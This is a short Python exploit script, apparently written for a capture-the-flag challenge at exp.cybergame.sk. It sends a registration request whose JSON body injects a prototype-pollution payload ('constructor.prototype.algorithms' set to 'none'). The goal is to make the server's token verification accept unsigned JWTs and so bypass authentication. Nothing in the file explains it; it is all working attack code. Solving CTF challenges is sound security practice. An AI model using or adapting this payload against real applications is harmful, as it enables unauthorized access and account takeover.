import requests

url_reg = "http://exp.cybergame.sk:7021/api/v2/register"
payload = {
    "username": "admin2004",
    "password": "password",
    "constructor": {
        "prototype": {
            "algorithms": ["none"]
        }
    }
}
r = requests.post(url_reg, json=payload, headers={"Content-Type": "application/json"})
print("Reg:", r.text)
